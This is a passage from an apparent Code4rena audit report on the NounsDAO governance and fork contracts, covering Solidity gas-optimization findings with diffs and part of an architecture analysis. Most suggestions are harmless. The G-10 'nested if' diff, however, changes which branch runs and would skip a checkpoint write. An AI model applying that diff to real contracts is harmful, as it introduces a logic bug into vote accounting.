             nouns.getPriorVotes(msg.sender, block.number - 1) > temp.proposalThreshold,
             'NounsDAO::propose: proposer votes below proposal threshold'
         );
-        require(
-            targets.length == values.length &&
-                targets.length == signatures.length &&
-                targets.length == calldatas.length,
-            'NounsDAO::propose: proposal function information arity mismatch'
-        );
-        require(targets.length != 0, 'NounsDAO::propose: must provide actions');
-        require(targets.length <= proposalMaxOperations, 'NounsDAO::propose: too many actions');
```

### Reorder the checks to have the cheaper checks first
https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/fork/newdao/governance/NounsDAOLogicV1Fork.sol#L617-L618

```solidity
File: /packages/nouns-contracts/contracts/governance/fork/newdao/governance/NounsDAOLogicV1Fork.sol
617:        require(state(proposalId) == ProposalState.Active, 'NounsDAO::castVoteInternal: voting is closed');
618:        require(support <= 2, 'NounsDAO::castVoteInternal: invalid vote type');
```
The first check involves reading a state variable while the second check just reads a function parameter. To minimize gas consumed in case of a revert on the second check, we should do it first as it's cheaper.

```diff
-        require(state(proposalId) == ProposalState.Active, 'NounsDAO::castVoteInternal: voting is closed');
         require(support <= 2, 'NounsDAO::castVoteInternal: invalid vote type');
+        require(state(proposalId) == ProposalState.Active, 'NounsDAO::castVoteInternal: voting is closed');
```

### Validations that involve state reads should not be done at the beginning if we have other cheaper checks
https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/fork/newdao/governance/NounsDAOLogicV1Fork.sol#L646-L650

```solidity
File: /packages/nouns-contracts/contracts/governance/fork/newdao/governance/NounsDAOLogicV1Fork.sol
646:        require(msg.sender == admin, 'NounsDAO::_setVotingDelay: admin only');
647:        require(
648:            newVotingDelay >= MIN_VOTING_DELAY && newVotingDelay <= MAX_VOTING_DELAY,
649:            'NounsDAO::_setVotingDelay: invalid voting delay'
650:        );
```
The second check is cheaper as it just reads a function parameter and a constant variable.

```diff
     function _setVotingDelay(uint256 newVotingDelay) external {
-        require(msg.sender == admin, 'NounsDAO::_setVotingDelay: admin only');
         require(
             newVotingDelay >= MIN_VOTING_DELAY && newVotingDelay <= MAX_VOTING_DELAY,
             'NounsDAO::_setVotingDelay: invalid voting delay'
         );
+        require(msg.sender == admin, 'NounsDAO::_setVotingDelay: admin only');
         uint256 oldVotingDelay = votingDelay;
         votingDelay = newVotingDelay;
```

### Reorder the checks to have cheaper checks first
https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/fork/newdao/governance/NounsDAOLogicV1Fork.sol#L662-L666

```solidity
File: /packages/nouns-contracts/contracts/governance/fork/newdao/governance/NounsDAOLogicV1Fork.sol
662:        require(msg.sender == admin, 'NounsDAO::_setVotingPeriod: admin only');
663:        require(
664:            newVotingPeriod >= MIN_VOTING_PERIOD && newVotingPeriod <= MAX_VOTING_PERIOD,
665:            'NounsDAO::_setVotingPeriod: invalid voting period'
666:        );
```

```diff
     function _setVotingPeriod(uint256 newVotingPeriod) external {
-        require(msg.sender == admin, 'NounsDAO::_setVotingPeriod: admin only');
         require(
             newVotingPeriod >= MIN_VOTING_PERIOD && newVotingPeriod <= MAX_VOTING_PERIOD,
             'NounsDAO::_setVotingPeriod: invalid voting period'
         );
+        require(msg.sender == admin, 'NounsDAO::_setVotingPeriod: admin only');
         uint256 oldVotingPeriod = votingPeriod;
         votingPeriod = newVotingPeriod;
```

### Any variable checks should be done first
https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/fork/newdao/token/NounsTokenFork.sol#L166-L185

```solidity
File: /packages/nouns-contracts/contracts/governance/fork/newdao/token/NounsTokenFork.sol
166:    function claimDuringForkPeriod(address to, uint256[] calldata tokenIds) external {
167:        uint256 currentNounId = _currentNounId;
168:        uint256 maxNounId = 0;
169:        if (msg.sender != escrow.dao()) revert OnlyOriginalDAO();
170:        if (block.timestamp >= forkingPeriodEndTimestamp) revert OnlyDuringForkingPeriod();
```

Instead of reading from states and performing some other variable initialization, we should do the if checks first. This way we can revert early and cheaply if our conditions are not met.

```diff
     function claimDuringForkPeriod(address to, uint256[] calldata tokenIds) external {
-        uint256 currentNounId = _currentNounId;
-        uint256 maxNounId = 0;
         if (msg.sender != escrow.dao()) revert OnlyOriginalDAO();
         if (block.timestamp >= forkingPeriodEndTimestamp) revert OnlyDuringForkingPeriod();
+        uint256 currentNounId = _currentNounId;
+        uint256 maxNounId = 0;

         for (uint256 i = 0; i < tokenIds.length; i++) {
             uint256 nounId = tokenIds[i];
```

### Reorder the checks here to avoid wasting gas on later reverts
https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/fork/newdao/token/base/ERC721CheckpointableUpgradeable.sol#L145-L154

```solidity
File: /packages/nouns-contracts/contracts/governance/fork/newdao/token/base/ERC721CheckpointableUpgradeable.sol
145:        require(delegatee != address(0), 'ERC721Checkpointable::delegateBySig: delegatee cannot be zero address');

154:        require(block.timestamp <= expiry, 'ERC721Checkpointable::delegateBySig: signature expired');
```
The require check on line 154 basically validates a function parameter which is not that gas intensive. Before we hit the check, we are performing some other operations which are gas intensive. If we do revert on the check on line 154, the gas spent doing other operations would just be wasted. We can reorder the operations to perform the parameter checks earlier.

```diff
diff --git a/packages/nouns-contracts/contracts/governance/fork/newdao/token/base/ERC721CheckpointableUpgradeable.sol b/packages/nouns-contracts/contracts/governance/fork/newdao/token/base/ERC721CheckpointableUpgradeable.sol
index 47aabf7c..b2d79195 100644
--- a/packages/nouns-contracts/contracts/governance/fork/newdao/token/base/ERC721CheckpointableUpgradeable.sol
+++ b/packages/nouns-contracts/contracts/governance/fork/newdao/token/base/ERC721CheckpointableUpgradeable.sol
@@ -143,6 +143,7 @@ abstract contract ERC721CheckpointableUpgradeable is ERC721EnumerableUpgradeable
         bytes32 s
     ) public {
         require(delegatee != address(0), 'ERC721Checkpointable::delegateBySig: delegatee cannot be zero address');
+        require(block.timestamp <= expiry, 'ERC721Checkpointable::delegateBySig: signature expired');
         bytes32 domainSeparator = keccak256(
             abi.encode(DOMAIN_TYPEHASH, keccak256(bytes(name())), block.chainid, address(this))
         );
@@ -151,7 +152,6 @@ abstract contract ERC721CheckpointableUpgradeable is ERC721EnumerableUpgradeable
         address signatory = ecrecover(digest, v, r, s);
         require(signatory != address(0), 'ERC721Checkpointable::delegateBySig: invalid signature');
         require(nonce == nonces[signatory]++, 'ERC721Checkpointable::delegateBySig: invalid nonce');
-        require(block.timestamp <= expiry, 'ERC721Checkpointable::delegateBySig: signature expired');
         return _delegate(signatory, delegatee);
     }
```

</details>

## [G-09] The following functions can benefit from some optimizations

<details>

### We can  optimize the function `_acceptAdmin` (Save 4 SLOADS: ~400 gas)
https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol#L854-L870

```solidity
File: /packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol
854:    function _acceptAdmin() external {
855:        // Check caller is pendingAdmin and pendingAdmin ≠ address(0)
856:        require(msg.sender == pendingAdmin && msg.sender != address(0), 'NounsDAO::_acceptAdmin: pending admin only');

858:        // Save current values for inclusion in log
859:        address oldAdmin = admin;
860:        address oldPendingAdmin = pendingAdmin;

862:        // Store admin with value pendingAdmin
863:        admin = pendingAdmin;

865:        // Clear the pending value
866:        pendingAdmin = address(0);

868:        emit NewAdmin(oldAdmin, admin);
869:        emit NewPendingAdmin(oldPendingAdmin, pendingAdmin);
870:    }
```
The first thing the function does is validate that `msg.sender== pendingAdmin` which means that to proceed with execution the state variable `pendingAdmin` should be equal to `msg.sender`. As such instead of reading  the state variable `pendingAdmin` on the next operations, we can replace it's occurrence with the cheaper global variable `msg.sender`.

On line 866, we set `pendingAdmin = address(0)`, we then proceed to emit an event that has the state variable `pendingAdmin`, we can refactor this emit to emit the `address(0)` instead as we already know that's the value of the state variable.

```diff
diff --git a/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol b/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol
index ff426a81..1cd99181 100644
--- a/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol
+++ b/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol
@@ -857,16 +857,16 @@ contract NounsDAOLogicV2 is NounsDAOStorageV2, NounsDAOEventsV2 {

         // Save current values for inclusion in log
         address oldAdmin = admin;
-        address oldPendingAdmin = pendingAdmin;
+        address oldPendingAdmin = msg.sender;

         // Store admin with value pendingAdmin
-        admin = pendingAdmin;
+        admin = msg.sender;

         // Clear the pending value
         pendingAdmin = address(0);

-        emit NewAdmin(oldAdmin, admin);
-        emit NewPendingAdmin(oldPendingAdmin, pendingAdmin);
+        emit NewAdmin(oldAdmin, msg.sender);
+        emit NewPendingAdmin(oldPendingAdmin, address(0));
     }

```

### We can optimize the function `_acceptVetoer()` Save 3 SLOADS: ~300 gas
https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol#L886-L898

```solidity
File: /packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol
886:    function _acceptVetoer() external {
887:        if (msg.sender != pendingVetoer) {
888:            revert PendingVetoerOnly();
889:        }

891:        // Update vetoer
892:        emit NewVetoer(vetoer, pendingVetoer);
893:        vetoer = pendingVetoer;

895:        // Clear the pending value
896:        emit NewPendingVetoer(pendingVetoer, address(0));
897:        pendingVetoer = address(0);
898:    }
```

The first check ensures that `msg.sender` is equal to `pendingVetoer` and reverts if not. Thus executing other operations on this function is guaranteed that the `msg.sender` is same as `pendingVetoer`. As `pendingVetoer` is a state variable, we can replace it's occurrence with `msg.sender` which is a global variable thus more cheaper to read.

```diff
diff --git a/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol b/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol
index ff426a81..7be11cf8 100644
--- a/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol
+++ b/packages/nouns-contracts/contracts/governance/NounsDAOLogicV2.sol
@@ -889,11 +889,11 @@ contract NounsDAOLogicV2 is NounsDAOStorageV2, NounsDAOEventsV2 {
         }

         // Update vetoer
-        emit NewVetoer(vetoer, pendingVetoer);
-        vetoer = pendingVetoer;
+        emit NewVetoer(vetoer, msg.sender);
+        vetoer = msg.sender;

         // Clear the pending value
-        emit NewPendingVetoer(pendingVetoer, address(0));
+        emit NewPendingVetoer(msg.sender, address(0));
         pendingVetoer = address(0);
     }
```

### We can optimize the function `_acceptAdmin()` Save 3 SLOADS: ~300 gas
https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOV3Admin.sol#L276-L295

```solidity
File: /packages/nouns-contracts/contracts/governance/NounsDAOV3Admin.sol
276:    function _acceptAdmin(NounsDAOStorageV3.StorageV3 storage ds) external {
277:        // Check caller is pendingAdmin and pendingAdmin ≠ address(0)
278:        require(
279:            msg.sender == ds.pendingAdmin && msg.sender != address(0),
280:            'NounsDAO::_acceptAdmin: pending admin only'
281:        );

283:        // Save current values for inclusion in log
284:        address oldAdmin = ds.admin;
285:        address oldPendingAdmin = ds.pendingAdmin;

287:        // Store admin with value pendingAdmin
288:        ds.admin = ds.pendingAdmin;

290:        // Clear the pending value
291:        ds.pendingAdmin = address(0);

293:        emit NewAdmin(oldAdmin, ds.admin);
294:        emit NewPendingAdmin(oldPendingAdmin, address(0));
295:    }
```
We are checking that `msg.sender == ds.pendingAdmin` and reverting if not. Instead of reading `ds.pendingAdmin` which is  a state variable in next operations, we can instead read `msg.sender` which is a global variable hence more cheaper in terms of gas.

We then set `ds.admin` equal to `ds.pendingAdmin`(which we've established is equal to `msg.sender`). On the emit block, instead of emitting `ds.admin` we might as well just emit `msg.sender`.

```diff
diff --git a/packages/nouns-contracts/contracts/governance/NounsDAOV3Admin.sol b/packages/nouns-contracts/contracts/governance/NounsDAOV3Admin.sol
index 4dcacae8..452e89b4 100644
--- a/packages/nouns-contracts/contracts/governance/NounsDAOV3Admin.sol
+++ b/packages/nouns-contracts/contracts/governance/NounsDAOV3Admin.sol
@@ -282,15 +282,15 @@ library NounsDAOV3Admin {

         // Save current values for inclusion in log
         address oldAdmin = ds.admin;
-        address oldPendingAdmin = ds.pendingAdmin;
+        address oldPendingAdmin = msg.sender;

         // Store admin with value pendingAdmin
-        ds.admin = ds.pendingAdmin;
+        ds.admin = msg.sender;

         // Clear the pending value
         ds.pendingAdmin = address(0);

-        emit NewAdmin(oldAdmin, ds.admin);
+        emit NewAdmin(oldAdmin, msg.sender);
         emit NewPendingAdmin(oldPendingAdmin, address(0));
     }
```

### `_acceptVetoer()` can be optimized (Save 3 SLOADs: ~300 gas)
https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOV3Admin.sol#L314-L326

```solidity
File: /packages/nouns-contracts/contracts/governance/NounsDAOV3Admin.sol
314:    function _acceptVetoer(NounsDAOStorageV3.StorageV3 storage ds) external {
315:        if (msg.sender != ds.pendingVetoer) {
316:            revert PendingVetoerOnly();
317:        }

319:        // Update vetoer
320:        emit NewVetoer(ds.vetoer, ds.pendingVetoer);
321:        ds.vetoer = ds.pendingVetoer;

323:        // Clear the pending value
324:        emit NewPendingVetoer(ds.pendingVetoer, address(0));
325:        ds.pendingVetoer = address(0);
326:    }
```

The first check ensures that `msg.sender`  is same as `ds.pendingVetoer` and reverts the call if not. We can therefore save some gas by replacing the `ds.pendingVetoer` variable access with `msg.sender`.

```diff
diff --git a/packages/nouns-contracts/contracts/governance/NounsDAOV3Admin.sol b/packages/nouns-contracts/contracts/governance/NounsDAOV3Admin.sol
index 4dcacae8..f7fe6acd 100644
--- a/packages/nouns-contracts/contracts/governance/NounsDAOV3Admin.sol
+++ b/packages/nouns-contracts/contracts/governance/NounsDAOV3Admin.sol
@@ -317,11 +317,11 @@ library NounsDAOV3Admin {
         }

         // Update vetoer
-        emit NewVetoer(ds.vetoer, ds.pendingVetoer);
-        ds.vetoer = ds.pendingVetoer;
+        emit NewVetoer(ds.vetoer, msg.sender);
+        ds.vetoer = msg.sender;

         // Clear the pending value
-        emit NewPendingVetoer(ds.pendingVetoer, address(0));
+        emit NewPendingVetoer(msg.sender, address(0));
         ds.pendingVetoer = address(0);
     }
```

### Cheaper to read global variable compared to state variable (Save 1 SLOAD: ~100 gas)
https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOV3Admin.sol#L332-L337

```solidity
File: /packages/nouns-contracts/contracts/governance/NounsDAOV3Admin.sol
332:    function _burnVetoPower(NounsDAOStorageV3.StorageV3 storage ds) public {
333:        // Check caller is vetoer
334:        require(msg.sender == ds.vetoer, 'NounsDAO::_burnVetoPower: vetoer only');

336:        // Update vetoer to 0x0
337:        emit NewVetoer(ds.vetoer, address(0));
```

```diff
diff --git a/packages/nouns-contracts/contracts/governance/NounsDAOV3Admin.sol b/packages/nouns-contracts/contracts/governance/NounsDAOV3Admin.sol
index 4dcacae8..1f747a58 100644
--- a/packages/nouns-contracts/contracts/governance/NounsDAOV3Admin.sol
+++ b/packages/nouns-contracts/contracts/governance/NounsDAOV3Admin.sol
@@ -334,7 +334,7 @@ library NounsDAOV3Admin {
         require(msg.sender == ds.vetoer, 'NounsDAO::_burnVetoPower: vetoer only');

         // Update vetoer to 0x0
-        emit NewVetoer(ds.vetoer, address(0));
+        emit NewVetoer(msg.sender, address(0));
         ds.vetoer = address(0);
```

### We can optimize the function `_acceptAdmin()` (Save 4 SLOADs: ~400 Gas)
https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/fork/newdao/governance/NounsDAOLogicV1Fork.sol#L731-L747

```solidity
File: /packages/nouns-contracts/contracts/governance/fork/newdao/governance/NounsDAOLogicV1Fork.sol
731:    function _acceptAdmin() external {
732:        // Check caller is pendingAdmin and pendingAdmin ≠ address(0)
733:        require(msg.sender == pendingAdmin && msg.sender != address(0), 'NounsDAO::_acceptAdmin: pending admin only');

735:        // Save current values for inclusion in log
736:        address oldAdmin = admin;
737:        address oldPendingAdmin = pendingAdmin;

739:        // Store admin with value pendingAdmin
740:        admin = pendingAdmin;

742:        // Clear the pending value
743:        pendingAdmin = address(0);

745:        emit NewAdmin(oldAdmin, admin);
746:        emit NewPendingAdmin(oldPendingAdmin, pendingAdmin);
747:    }
```

```diff
diff --git a/packages/nouns-contracts/contracts/governance/fork/newdao/governance/NounsDAOLogicV1Fork.sol b/packages/nouns-contracts/contracts/governance/fork/newdao/governance/NounsDAOLogicV1Fork.sol
index 0b098e44..7351d0d9 100644
--- a/packages/nouns-contracts/contracts/governance/fork/newdao/governance/NounsDAOLogicV1Fork.sol
+++ b/packages/nouns-contracts/contracts/governance/fork/newdao/governance/NounsDAOLogicV1Fork.sol
@@ -734,16 +734,16 @@ contract NounsDAOLogicV1Fork is UUPSUpgradeable, ReentrancyGuardUpgradeable, Nou

         // Save current values for inclusion in log
         address oldAdmin = admin;
-        address oldPendingAdmin = pendingAdmin;
+        address oldPendingAdmin = msg.sender;

         // Store admin with value pendingAdmin
-        admin = pendingAdmin;
+        admin = msg.sender;

         // Clear the pending value
         pendingAdmin = address(0);

-        emit NewAdmin(oldAdmin, admin);
-        emit NewPendingAdmin(oldPendingAdmin, pendingAdmin);
+        emit NewAdmin(oldAdmin, msg.sender);
+        emit NewPendingAdmin(oldPendingAdmin, address(0));
     }
```

</details>

## [G-10] Nested if is cheaper than single statement
https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/base/ERC721Checkpointable.sol#L243-L245

```solidity
File: /packages/nouns-contracts/contracts/base/ERC721Checkpointable.sol
243:        if (nCheckpoints > 0 && checkpoints[delegatee][nCheckpoints - 1].fromBlock == blockNumber) {
244:            checkpoints[delegatee][nCheckpoints - 1].votes = newVotes;
245        } else {          }
```

```diff

-        if (nCheckpoints > 0 && checkpoints[delegatee][nCheckpoints - 1].fromBlock == blockNumber) {
-            checkpoints[delegatee][nCheckpoints - 1].votes = newVotes;
+        if (nCheckpoints > 0) {
+            if( checkpoints[delegatee][nCheckpoints - 1].fromBlock == blockNumber) {
+                 checkpoints[delegatee][nCheckpoints - 1].votes = newVotes;
+            }
         } else {
```

https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/fork/newdao/governance/NounsDAOLogicV1Fork.sol#L381-L383
```solidity
File: /packages/nouns-contracts/contracts/governance/fork/newdao/governance/NounsDAOLogicV1Fork.sol
381:        if (block.timestamp < delayedGovernanceExpirationTimestamp && nouns.remainingTokensToClaim() > 0) {
382:            revert WaitingForTokensToClaimOrExpiration();
383:        }
```

```diff
-        if (block.timestamp < delayedGovernanceExpirationTimestamp && nouns.remainingTokensToClaim() > 0) {
-            revert WaitingForTokensToClaimOrExpiration();
+        if (block.timestamp < delayedGovernanceExpirationTimestamp) {
+            if ( nouns.remainingTokensToClaim() > 0) {
+                revert WaitingForTokensToClaimOrExpiration();
+            }
```

## [G-11] Caching a variable that is used once just wastes Gas

### No need to cache `ds.forkEscrow` as it's being used once
https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/fork/NounsDAOV3Fork.sol#L141-L160

```solidity
File: /packages/nouns-contracts/contracts/governance/fork/NounsDAOV3Fork.sol
141:    function joinFork(
142:        NounsDAOStorageV3.StorageV3 storage ds,
143:        uint256[] calldata tokenIds,
144:        uint256[] calldata proposalIds,
145:        string calldata reason
146:    ) external {
147:        if (!isForkPeriodActive(ds)) revert ForkPeriodNotActive();

149:        INounsDAOForkEscrow forkEscrow = ds.forkEscrow;
150:        address timelock = address(ds.timelock);
151:        sendProRataTreasury(ds, ds.forkDAOTreasury, tokenIds.length, adjustedTotalSupply(ds));

153:        for (uint256 i = 0; i < tokenIds.length; i++) {
154:            ds.nouns.transferFrom(msg.sender, timelock, tokenIds[i]);
155:        }

157:        NounsTokenFork(ds.forkDAOToken).claimDuringForkPeriod(msg.sender, tokenIds);

159:        emit JoinFork(forkEscrow.forkId() - 1, msg.sender, tokenIds, proposalIds, reason);
160:    }
```

```diff
diff --git a/packages/nouns-contracts/contracts/governance/fork/NounsDAOV3Fork.sol b/packages/nouns-contracts/contracts/governance/fork/NounsDAOV3Fork.sol
index d87ffc70..4051da05 100644
--- a/packages/nouns-contracts/contracts/governance/fork/NounsDAOV3Fork.sol
+++ b/packages/nouns-contracts/contracts/governance/fork/NounsDAOV3Fork.sol
@@ -146,7 +146,6 @@ library NounsDAOV3Fork {
     ) external {
         if (!isForkPeriodActive(ds)) revert ForkPeriodNotActive();

-        INounsDAOForkEscrow forkEscrow = ds.forkEscrow;
         address timelock = address(ds.timelock);
         sendProRataTreasury(ds, ds.forkDAOTreasury, tokenIds.length, adjustedTotalSupply(ds));

@@ -156,7 +155,7 @@ library NounsDAOV3Fork {

         NounsTokenFork(ds.forkDAOToken).claimDuringForkPeriod(msg.sender, tokenIds);

-        emit JoinFork(forkEscrow.forkId() - 1, msg.sender, tokenIds, proposalIds, reason);
+        emit JoinFork(ds.forkEscrow.forkId() - 1, msg.sender, tokenIds, proposalIds, reason);
     }
```

### NounsTokenFork.sol.claimDuringForkPeriod(): `_currentNounId` should not be cached
https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/fork/newdao/token/NounsTokenFork.sol#L166-L185

The variable `currentNounId` is being once, as such no need to cache.

```solidity
File: /packages/nouns-contracts/contracts/governance/fork/newdao/token/NounsTokenFork.sol
166:    function claimDuringForkPeriod(address to, uint256[] calldata tokenIds) external {
167:        uint256 currentNounId = _currentNounId;

184:        if (maxNounId >= currentNounId) _currentNounId = maxNounId + 1;
```

## [G-12] Importing an entire library while only using one function isn't necessary
https://github.com/nounsDAO/nouns-monorepo/blob/718211e063d511eeda1084710f6a682955e80dcb/packages/nouns-contracts/contracts/governance/NounsDAOV3Votes.sol#L22

```solidity
File: /packages/nouns-contracts/contracts/governance/NounsDAOV3Votes.sol
22:import { SafeCast } from '@openzeppelin/contracts/utils/math/SafeCast.sol';

252:            proposal.objectionPeriodEndBlock = SafeCast.toUint64(
253:                proposal.endBlock + ds.objectionPeriodDurationInBlocks
254:            );
```

We import the entire library `SafeCast` yet we only need to utilize one function from it ie `toUint64()`. Peeking into it's implementation from Openzeppelin we have the following
https://github.com/OpenZeppelin/openzeppelin-contracts/blob/7ccea54dc15856d0e6c3b61b829b85d9e52195cd/contracts/utils/math/SafeCast.sol#L441-L446.

```solidity
File: /contracts/utils/math/SafeCast.sol
441:    function toUint64(uint256 value) internal pure returns (uint64) {
442:        if (value > type(uint64).max) {
443:            revert SafeCastOverflowedUintDowncast(64, value);
444:        }
445:        return uint64(value);
446:    }
```

```diff
diff --git a/packages/nouns-contracts/contracts/governance/NounsDAOV3Votes.sol b/packages/nouns-contracts/contracts/governance/NounsDAOV3Votes.sol
index 3743132b..782a2cf2 100644
--- a/packages/nouns-contracts/contracts/governance/NounsDAOV3Votes.sol
+++ b/packages/nouns-contracts/contracts/governance/NounsDAOV3Votes.sol
@@ -19,13 +19,14 @@ pragma solidity ^0.8.19;

 import './NounsDAOInterfaces.sol';
 import { NounsDAOV3Proposals } from './NounsDAOV3Proposals.sol';
-import { SafeCast } from '@openzeppelin/contracts/utils/math/SafeCast.sol';

 library NounsDAOV3Votes {
     using NounsDAOV3Proposals for NounsDAOStorageV3.StorageV3;

     error CanOnlyVoteAgainstDuringObjectionPeriod();

+    error SafeCastOverflowedUintDowncast();
+
     /// @notice An event emitted when a vote has been cast on a proposal
     /// @param voter The address which casted a vote
     /// @param proposalId The proposal id which was voted on
@@ -249,9 +250,11 @@ library NounsDAOV3Votes {
             // second part of the vote flip check
             !ds.isDefeated(proposal)
         ) {
-            proposal.objectionPeriodEndBlock = SafeCast.toUint64(
-                proposal.endBlock + ds.objectionPeriodDurationInBlocks
-            );
+
+            if (proposal.endBlock + ds.objectionPeriodDurationInBlocks  > type(uint64).max) {
+                        revert SafeCastOverflowedUintDowncast();
+            }
+            proposal.objectionPeriodEndBlock = uint64(proposal.endBlock + ds.objectionPeriodDurationInBlocks);

             emit ProposalObjectionPeriodSet(proposal.id, proposal.objectionPeriodEndBlock);
         }
```

Alternatively we can implement our own internal function to do the safeCast.

## Conclusion
It is important to emphasize that the provided recommendations aim to enhance the efficiency of the code without compromising its readability. We understand the value of maintainable and easily understandable code to both developers and auditors.

As you proceed with implementing the suggested optimizations, please exercise caution and be diligent in conducting thorough testing. It is crucial to ensure that the changes are not introducing any new vulnerabilities and that the desired performance improvements are achieved. Review code changes, and perform thorough testing to validate the effectiveness and security of the refactored code.

Should you have any questions or need further assistance, please don't hesitate to reach out.



***


# Audit Analysis

For this audit, 5 analysis reports were submitted by wardens. An analysis report examines the codebase as a whole, providing observations and advice on such topics as architecture, mechanism, or approach. The [report highlighted below](https://github.com/code-423n4/2023-07-nounsdao-findings/issues/122) by **0xnev** received the top score from the judge.

*The following wardens also submitted reports: [0xSmartContract](https://github.com/code-423n4/2023-07-nounsdao-findings/issues/263), [shark](https://github.com/code-423n4/2023-07-nounsdao-findings/issues/237), [Matin](https://github.com/code-423n4/2023-07-nounsdao-findings/issues/209), [K42](https://github.com/code-423n4/2023-07-nounsdao-findings/issues/208), and [ihtishamsudo](https://github.com/code-423n4/2023-07-nounsdao-findings/issues/148).*

## [01] Summary of Codebase

### 1.1 Description
Nouns is a generative NFT project on Ethereum, where a new Noun is minted and auctioned off every day, and each token represents one vote where proposers who hold a noun and create and vote on governance proposals, which execute transactions on the ethereum blockchain when approved.

### 1.2 Proposal States and flow
To summarize the NounsDAO protocol, it will be helpful to look at the various states introduced in the NounsDaoV3 contracts. But first lets look at the creation of proposals.

### 1.2.1 Creation of Proposal
- Propose the proposal via `propose/proposeOnTimelockV1/proposeBySigs`
- Check that proposer (and if there is signers), have sufficient votes to meet minimum voting threshold
- Check validity of signatures if there are signers
- Check transactions validity (array length check and maximum actions (10) allowed check)
- Check that there is no active proposal for proposer (NounsDao only allows 1 active proposal per proposer)
- Create a new proposal if check passes, at this stage, proposal will be in the Updatable state

### 1.2.2 Updatable
- At this stage, proposals are not active for voting yet, and there exists a updatable period for proposers/signers to edit proposals transaction details and description via `updateProposal()/updateProposalTransactions()/updateProposalBySigs()` and `updateProposalDescription()` respectively

### 1.2.3 Pending
- Once updatable period ends, the proposal reaches the pending state, where it switches to Active once the `block.number` reaches the starting block.

### 1.2.4 Active 
- During the Active state, voters can start casting votes, where the uint8 `support` represents the vote value, with 0 = against, 1 = for and 2 = abstain
- Vote casting can be done via `castVote()/castVoteWithReason()/castVoteBySig()` 
- Voting casting can also be done with a request for gas refund from DAO via `castRefundableVote()/castRefundableVoteWithReason()`
- In the Active state, there exists 3 state transitions:
    1. During the active period if there are enough votes that exceeds quorum, and for votes more than against votes, then proposal state will switch to Succeeded.
    2. If the opposite occurs where against votes are more than for votes, proposal state will switch to Defeated
    3. The NounsDaoV3 introduced a new mechanism known as the objection period, where against voters are given more reaction time to react to last minute state transitions from Defeated to Succeeded. A more detailed explanation is included in 1.2.5

### 1.2.5 ObjectionPeriod
- The ObjectionPeriod is a conditional state where any last minute votes swinging a already Defeated proposal to Succeeded by for voters supporting proposal will trigger the state
- In this period, only against voters are allowed to vote to allow them to swing the proposal back to the Defeated state.
- If enough against voters votes against proposal, then the final proposal state will be Defeated, and proposal will not be queued and executed

### 1.2.6 Queued and Executed
- If the current state of proposal after Active period of voting is Succeeded, then proposal is ready to be queued and executed by admin via the `NounsDaoExecutorV2.sol` contract
- More specifically, proposals are queued using `queueTransaction()` and executed via `executeTransaction()`

### 1.2.7 Expired
- If proposals are not executed within 21 days (increased from 14 days to account for possible forking period) after being queued, then it will expire

### 1.2.8 Cancelled
- At any point of time, proposers and/or signers can cancel active proposals as long as proposal has not reached a final state, specifically following states (`Canceled/Defeated/Expired/Executed/Vetoed`).

### 1.2.9 Vetoed
- The Vetoed state essentially means that proposal is Cancelled by vetoer set by NounsDAO
- It is a means for NounsDAO to protect the protocol against malicious proposals.

### 1.3 Forking Mechanism
- There is also a new forking mechanism that allows forking of a new Noun Dao if enough Noun tokens are escrowed
- This is wonderfully summarized by the protocol [here](https://github.com/verbsteam/nouns-fork-spec/blob/main/spec.md)

## [02] Architecture Improvements

### 2.1 Consider allowing for voters to recover from swing last minute swing from successful to defeated

Currently, the Nouns Dao introduce a objection period where there is a last-minute proposal swing from defeated to successful, affording against voters more reaction time. 

This could be unfair to the for voters, where the reverse could happen, when there is a last-minute proposal swing from successful to defeated, but no time is allowed for for voters to react. Hence, protocol could introduce a new mechanism/state to allow this to happen, where similarly, only a against vote casted in the last minute voting block can trigger this period.

### 2.2 Consider implementing a mechanism to unvote and/or updated vote choice
Currently, there are no mechanisms for voters to unvote or update their votes, and they can only ever vote once due to the `hasVoted` flag. Consider implementing a mechanism to unvote and/or update vote choice.

### 2.3 Consider not allowing creation of new proposal when current proposal is still in Queued state

